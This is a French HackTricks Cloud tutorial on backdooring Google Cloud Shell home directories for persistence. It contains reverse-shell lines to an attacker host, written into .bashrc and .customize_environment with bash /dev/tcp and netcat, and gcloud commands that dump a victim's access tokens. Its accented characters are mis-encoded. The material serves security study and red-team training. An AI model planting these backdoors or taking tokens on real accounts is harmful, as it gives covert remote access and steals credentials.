# GCP - Persistance du Cloud Shell

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)
*
*
*
* &#x20;github repos.

</details>

## Cloud Shell

Pour plus d'informations, consultez :

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### Backdoor Persistante

[**Google Cloud Shell**](https://cloud.google.com/shell/) vous offre un acc√®s en ligne de commande √† vos ressources cloud directement depuis votre navigateur sans aucun co√ªt associ√©.

Vous pouvez acc√©der au Cloud Shell de Google depuis la **console web** ou en ex√©cutant **`gcloud cloud-shell ssh`**.

Cette console a des capacit√©s int√©ressantes pour les attaquants :

1. **Tout utilisateur Google ayant acc√®s √† Google Cloud** a acc√®s √† une instance Cloud Shell enti√®rement authentifi√©e (les comptes de service peuvent, m√™me en √©tant propri√©taires de l'organisation).
2. Cette instance **conservera son r√©pertoire personnel pendant au moins 120 jours** si aucune activit√© n'est d√©tect√©e.
3. Il n'y a **aucune capacit√© pour une organisation de surveiller** l'activit√© de cette instance.

Cela signifie essentiellement qu'un attaquant peut placer une backdoor dans le r√©pertoire personnel de l'utilisateur et tant que l'utilisateur se connecte au GC Shell au moins tous les 120 jours, la backdoor survivra et l'attaquant obtiendra un shell √† chaque fois qu'elle est ex√©cut√©e, simplement en faisant :

{% code overflow="wrap" %}
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
```markdown
Il y a un autre fichier dans le dossier personnel appel√© **`.customize_environment`** qui, s'il existe, sera **ex√©cut√© √† chaque fois** que l'utilisateur acc√®de au **cloud shell** (comme dans la technique pr√©c√©dente). Ins√©rez simplement le backdoor pr√©c√©dent ou un similaire au suivant pour maintenir la persistance tant que l'utilisateur utilise "fr√©quemment" le cloud shell :
```
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
Notez que **la premi√®re fois qu'une action GCP est effectu√©e dans Cloud Shell n√©cessitant une authentification**, elle **d√©clenche** une fen√™tre d'autorisation dans le navigateur de l'utilisateur qui doit √™tre accept√©e avant que la commande ne s'ex√©cute. Si un pop-up inattendu appara√Æt, la cible pourrait devenir m√©fiante et compromettre la m√©thode de persistance.

Voici le pop-up qui appara√Æt en ex√©cutant `gcloud projects list` depuis le cloud shell (en tant qu'attaquant) vu dans la session du navigateur de l'utilisateur.
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Cependant, si l'utilisateur a activement utilis√© le cloudshell, le pop-up n'appara√Ætra pas et vous pouvez **r√©cup√©rer les tokens de l'utilisateur avec** :
```bash
gcloud auth print-access-token
gcloud auth application-default print-access-token
```
#### Comment la connexion SSH est √©tablie

En gros, ces 3 appels API sont utilis√©s :

* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey) \[POST] (vous permet d'ajouter votre cl√© publique que vous avez cr√©√©e localement)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start) \[POST] (vous permet de d√©marrer l'instance)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default](https://content-cloudshell.googleapis.com/v1/users/me/environments/default) \[GET] (vous indique l'IP de la Google Cloud Shell)

Mais vous pouvez trouver plus d'informations dans [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)

## R√©f√©rences

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> !</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)
*
*
* &#x20;github repos.

</details>
